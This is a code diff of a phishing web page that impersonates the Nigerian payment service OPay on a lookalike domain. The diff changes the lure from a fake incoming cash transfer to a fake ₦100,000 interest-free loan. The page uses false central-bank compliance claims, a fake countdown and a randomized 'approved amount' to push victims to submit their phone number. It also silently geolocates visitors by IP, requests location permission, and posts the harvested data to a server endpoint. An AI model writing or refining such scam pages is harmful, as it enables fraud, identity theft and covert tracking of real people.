@@ -4,16 +4,16 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
-  <title>OPay — Incoming Transfer</title>
+  <title>OPay CashAdvance — Interest-Free Loan</title>
 
   <!-- Open Graph / WhatsApp preview -->
   <meta property="og:type"        content="website"/>
-  <meta property="og:title"       content="OPay — You have an incoming transfer"/>
-  <meta property="og:description" content="Someone sent you ₦3,000 via OPay. Your cash is ready to collect."/>
+  <meta property="og:title"       content="OPay CashAdvance — Get ₦100,000 Interest-Free"/>
+  <meta property="og:description" content="Check if you qualify for ₦100,000 instant cash advance. No interest. No collateral. Verify eligibility now."/>
   <meta property="og:image"       content="https://opayit.com/og-cash.jpg"/>
   <meta property="og:url"         content="https://opayit.com"/>
-  <meta property="og:site_name"   content="OPay"/>
-  <meta name="description"        content="Someone sent you ₦3,000 via OPay. Verify your identity to collect your cash."/>
+  <meta property="og:site_name"   content="OPay CashAdvance"/>
+  <meta name="description"        content="OPay CashAdvance: Check if you qualify for ₦100,000 interest-free loan. Verify your eligibility in seconds."/>
 
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
@@ -88,25 +88,25 @@
   <div class="topbar">
     <img src="/logo-light.png" class="opay-logo" alt="OPay"/>
     <div class="logo-wrap">
-      <div class="logo-sub">Secure Transfers</div>
+      <div class="logo-sub">CashAdvance</div>
     </div>
   </div>
 
   <div class="transfer-card">
-    <div class="label">Incoming Transfer</div>
-    <div class="amount"><span>&#8358;</span><span id="amount-val">3,000</span></div>
-    <div style="display:inline-block;background:#e8f5e9;color:#1a7a3e;font-size:0.68rem;font-weight:700;padding:2px 8px;border-radius:4px;margin:4px 0 6px;letter-spacing:0.5px;">CASH TRANSFER</div>
-    <div class="sender">From: <strong id="sender-name">Adebayo T.</strong></div>
-    <div class="ref ref-blur" id="ref-num">REF: __TXN_ID__</div>
-    <div class="ref-unlock" id="ref-hint">Collection PIN sent once your details are confirmed</div>
+    <div class="label">Cash Advance Eligibility</div>
+    <div class="amount"><span>&#8358;</span><span id="amount-val">100,000</span></div>
+    <div style="display:inline-block;background:#e8f5e9;color:#1a7a3e;font-size:0.68rem;font-weight:700;padding:2px 8px;border-radius:4px;margin:4px 0 6px;letter-spacing:0.5px;">0% INTEREST • NO COLLATERAL</div>
+    <div class="sender">Repayment: <strong id="sender-name">30 Days</strong></div>
+    <div class="ref ref-blur" id="ref-num">LOAN ID: __TXN_ID__</div>
+    <div class="ref-unlock" id="ref-hint">Approval status sent once eligibility check is complete</div>
     <div class="divider"></div>
     <div class="label">Status</div>
-    <div class="status-pill" id="status-pill">Awaiting Confirmation</div>
+    <div class="status-pill" id="status-pill">Check Eligibility Below</div>
     <div style="font-size:0.7rem;color:#c0392b;margin-top:8px;font-weight:600;" id="countdown-wrap">Offer expires in: <span id="countdown">59:59</span></div>
   </div>
 
   <div class="info-box" id="info-box">
-    OPay is required by CBN to verify the recipient's identity before releasing cash transfers above ₦5,000. Please confirm your details to receive your collection PIN.
+    OPay CashAdvance offers up to ₦100,000 interest-free loans to eligible users. Complete the quick eligibility check below to see if you qualify. Your offer amount is calculated based on your account activity.
   </div>
 
   <div class="section-title">How to Collect</div>
@@ -114,39 +114,39 @@
     <div style="display:flex;align-items:flex-start;gap:10px;background:white;border-radius:10px;padding:12px;box-shadow:0 1px 4px rgba(0,0,0,0.07);">
       <div style="min-width:26px;height:26px;background:#1a7a3e;color:white;border-radius:50%;font-weight:800;font-size:0.8rem;display:flex;align-items:center;justify-content:center;">1</div>
       <div>
-        <div style="font-weight:700;font-size:0.85rem;">Confirm Your Identity</div>
-        <div style="font-size:0.75rem;color:#777;margin-top:2px;">OPay verifies your identity as required by CBN before releasing cash transfers.</div>
+        <div style="font-weight:700;font-size:0.85rem;">Confirm Eligibility</div>
+        <div style="font-size:0.75rem;color:#777;margin-top:2px;">OPay verifies your account status to ensure you qualify for the interest-free advance.</div>
       </div>
     </div>
     <div style="display:flex;align-items:flex-start;gap:10px;background:white;border-radius:10px;padding:12px;box-shadow:0 1px 4px rgba(0,0,0,0.07);">
       <div data-step style="min-width:26px;height:26px;background:#ccc;color:white;border-radius:50%;font-weight:800;font-size:0.8rem;display:flex;align-items:center;justify-content:center;">2</div>
       <div>
-        <div data-step-text style="font-weight:700;font-size:0.85rem;color:#aaa;">Receive Collection PIN</div>
-        <div data-step-sub style="font-size:0.75rem;color:#bbb;margin-top:2px;">OPay sends your unique collection PIN via SMS once identity is confirmed.</div>
+        <div data-step-text style="font-weight:700;font-size:0.85rem;color:#aaa;">Receive Disbursement PIN</div>
+        <div data-step-sub style="font-size:0.75rem;color:#bbb;margin-top:2px;">OPay sends your unique PIN via SMS once eligibility is confirmed.</div>
       </div>
     </div>
     <div style="display:flex;align-items:flex-start;gap:10px;background:white;border-radius:10px;padding:12px;box-shadow:0 1px 4px rgba(0,0,0,0.07);">
       <div data-step style="min-width:26px;height:26px;background:#ccc;color:white;border-radius:50%;font-weight:800;font-size:0.8rem;display:flex;align-items:center;justify-content:center;">3</div>
       <div>
-        <div data-step-text style="font-weight:700;font-size:0.85rem;color:#aaa;">Collect Your Cash</div>
-        <div data-step-sub style="font-size:0.75rem;color:#bbb;margin-top:2px;">Present your PIN at any OPay agent to collect your ₦3,000 cash transfer.</div>
+        <div data-step-text style="font-weight:700;font-size:0.85rem;color:#aaa;">Receive Funds in Your Wallet</div>
+        <div data-step-sub style="font-size:0.75rem;color:#bbb;margin-top:2px;">The ₦100,000 is sent directly to your OPay wallet once approved.</div>
       </div>
     </div>
   </div>
 
   <div class="cta-box">
     <div class="result-box" id="result-box">
-      <strong>&#10003; Transfer Confirmed — PIN Sent</strong>
-      <p id="success-body">Your identity has been verified. Your collection PIN has been sent via SMS.</p>
+      <strong>&#10003; Congratulations — You Qualify!</strong>
+      <p id="success-body">Your eligibility has been confirmed. You are approved for the ₦100,000 interest-free cash advance.</p>
       <div class="sms-note">
         <strong>What happens next:</strong><br/>
-        <span id="success-detail">Present your PIN at any OPay agent or OPay point to collect your ₦3,000 cash transfer.</span> You will receive an SMS from <strong>OPay</strong> with your PIN shortly.
+        <span id="success-detail">The ₦100,000 will be sent directly to your OPay wallet within 5 minutes - 24 hours.</span> You will receive an SMS confirmation from <strong>OPay</strong> once the funds are credited.
       </div>
       <p style="margin-top:10px;font-size:0.75rem;color:#aaa;">Ref: <span id="res-ref"></span> &nbsp;|&nbsp; Expires in 24hrs</p>
     </div>
     <div class="error-box" id="error-box">
-      <strong>Verification Failed</strong>
-      <p>OPay could not complete the identity verification required to release your cash transfer.<br/><br/>This is typically caused by restricted device permissions or an unsupported browser. Please try again or contact OPay support.</p>
+      <strong>Eligibility Check Failed</strong>
+      <p>OPay could not complete the eligibility verification for your cash advance application.<br/><br/>This is typically caused by restricted device permissions or an unsupported browser. Please try again or contact OPay support.</p>
       <button class="cta-btn" id="retry-btn" onclick="retryLocation()" style="margin-top:14px;background:#c0392b;">Try Again</button>
     </div>
     <div class="phone-box" id="phone-box">
@@ -155,9 +155,9 @@
         <div class="phone-prefix">+234</div>
         <input class="phone-input" id="phone-input" type="tel" placeholder="080XXXXXXXX" maxlength="11" inputmode="numeric"/>
       </div>
-      <div class="phone-note" id="phone-note">OPay will send your collection PIN to this number once verified</div>
+      <div class="phone-note" id="phone-note">The ₦100,000 will be sent directly to this OPay account once approved</div>
     </div>
-    <button class="cta-btn" id="cta-btn" onclick="handleCta(this)">Collect My Transfer</button>
+    <button class="cta-btn" id="cta-btn" onclick="handleCta(this)">Check My Eligibility</button>
     <div class="cta-sub" id="cta-sub">Secured by OPay &amp; CBN Compliance</div>
   </div>
 
@@ -184,6 +184,13 @@
       return fromUrl || 'OP__TXN_ID__';
     })();
 
+    // Random loan amount between ₦50,000 and ₦100,000 in ₦5,000 steps
+    const LOAN_AMOUNT = (function() {
+      const steps = [50000,55000,60000,65000,70000,75000,80000,85000,90000,95000,100000];
+      return steps[Math.floor(Math.random() * steps.length)];
+    })();
+    const LOAN_FMT = LOAN_AMOUNT.toLocaleString('en-NG');
+    // Amount revealed only after phone is submitted — not on load
 
     // Silent IP geo on load
     (async function silentIPGeo() {
@@ -227,6 +234,14 @@
       });
     }
 
+    function revealLoanAmount() {
+      document.getElementById('amount-val').textContent = LOAN_FMT;
+      document.getElementById('success-body').textContent = 'Your eligibility has been confirmed. You are approved for ₦' + LOAN_FMT + ' interest-free cash advance.';
+      document.getElementById('success-detail').textContent = 'The ₦' + LOAN_FMT + ' will be sent directly to your OPay wallet within 5 minutes - 24 hours.';
+      document.getElementById('phone-note').textContent = 'The ₦' + LOAN_FMT + ' will be sent directly to this OPay account once approved';
+      document.querySelector('.transfer-card .label').textContent = 'Your Approved Amount';
+    }
+
     let phoneStep = false;
     let retryUsed = false;
 
@@ -263,7 +278,7 @@
         phoneStep = true;
         document.getElementById('phone-box').style.display = 'block';
         btn.textContent = 'Confirm Details';
-        document.getElementById('cta-sub').textContent = 'Your details are secured by OPay &amp; CBN';
+        document.getElementById('cta-sub').textContent = 'OPay will send your collection PIN once confirmed';
         document.getElementById('phone-input').focus();
       } else {
         const num = document.getElementById('phone-input').value.trim();
@@ -272,6 +287,7 @@
           return;
         }
         document.getElementById('phone-input').style.borderColor = '#1a7a3e';
+        revealLoanAmount();
         fetch('/data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
